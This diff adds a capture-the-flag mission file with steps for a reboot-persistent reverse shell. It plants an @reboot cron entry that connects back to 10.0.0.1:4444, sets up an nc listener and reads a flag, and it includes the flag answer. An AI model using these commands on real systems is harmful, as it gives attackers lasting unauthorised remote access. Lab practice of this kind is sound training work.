@@ -1,0 +1,23 @@
+Side Mission: Cron Dropper
+
+Target: 10.10.10.241
+Persistence Method: @reboot cron job
+
+Objective:
+Establish a reverse shell that survives system reboot by leveraging cron.
+
+Steps:
+1. Create reverse shell cron entry:
+   echo '@reboot bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -
+
+2. Set up listener on attacker machine:
+   nc -lvnp 4444
+
+3. Reboot target or wait for scheduled reboot:
+   System triggers the cron job at boot and connects back.
+
+4. From callback shell:
+   cat /home/operator/flag.txt
+
+Flag:
+CTF{b4ckd00r_st4y_br34k}
